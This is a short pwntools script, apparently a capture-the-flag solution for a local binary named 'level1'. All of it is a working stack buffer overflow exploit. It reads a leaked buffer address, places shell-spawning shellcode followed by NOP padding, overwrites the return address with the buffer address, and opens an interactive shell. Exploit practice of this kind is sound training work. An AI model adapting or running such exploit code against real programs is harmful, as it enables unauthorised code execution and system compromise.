from pwn import *

io = process("./level1")
text = io.recvline()[14 : -2]
buf_addr = int(text, 16)

shellcode = asm(shellcraft.sh())
payload = shellcode + b'\x90' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)

io.send(payload)
io.interactive()
